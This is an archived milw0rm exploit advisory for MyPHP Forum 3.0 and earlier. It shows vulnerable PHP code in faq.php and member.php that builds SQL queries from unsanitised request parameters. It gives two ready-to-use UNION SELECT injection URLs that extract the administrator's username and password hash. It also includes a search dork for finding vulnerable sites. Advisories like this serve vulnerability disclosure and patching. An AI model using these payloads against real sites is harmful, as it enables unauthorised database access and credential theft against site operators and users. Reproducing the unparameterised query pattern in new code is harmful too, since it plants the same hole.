<html><head><title>MyPHP Forum <= 3.0 (Final) Multiple SQL Injection Vulnerabilities</title></head><pre>Name            :  MyPHP Forum &lt;= 3.0 (Final) Multiple Remote SQL Injection Vulnerability
Author          :  x0kster
Email           :  x0kster@gmail.com
Site            :  ihteam.net
Script Download :  http://www.myphp.ws/
Date            :  31/12/2007
Dork            :  &quot;Powered by: MyPHP Forum&quot;

Note: 
For work, magic_quotes_gpc must be turned off on the server.
Usally the table prefix is 'nb'.



Sql injection in faq.php

   &lt;?php
    //faq.php
    [...]
    $id = $_GET['id'];
    if($action == &quot;view&quot; &amp;&amp; !empty($id)) {
	$result = mysql_query(&quot;SELECT * from $db_faq WHERE id='$id'&quot;) or die(mysql_error()); // &lt;-- So miss a control :-D
	$row = mysql_fetch_array($result);
	$row[answer] = postify($row[answer]);
    [...]
   ?&gt;

So we can execute an sql injection thrught the bugged variable $id.

PoC:

http://Site/faq.php?action=view&amp;id=-1'+union+select+1,concat(username,0x3a,password),3+from+{table_prefix}_member+where+uid=1/*




Sql injection in member.php

   &lt;?php
    //member.php
   [...]
    if($action == &quot;viewpro&quot;) {
	$member = $HTTP_GET_VARS['member'];
	$query = mysql_query(&quot;SELECT * FROM $db_member WHERE username='$member'&quot;) or die(mysql_error());
   [...]
   ?&gt;

So $member variable isn't controlled so we can exploit it.

PoC:

http://Site/member.php?action=viewpro&amp;member=-1'+union+select+1,2,3,4,5,6,7,8,9,concat(username,0x3a,password),11,12,13,14,15,16,17,18,19,20,21,22+from+{table_prefix}_member+where+uid=1/*

# milw0rm.com [2007-12-31]</pre></html>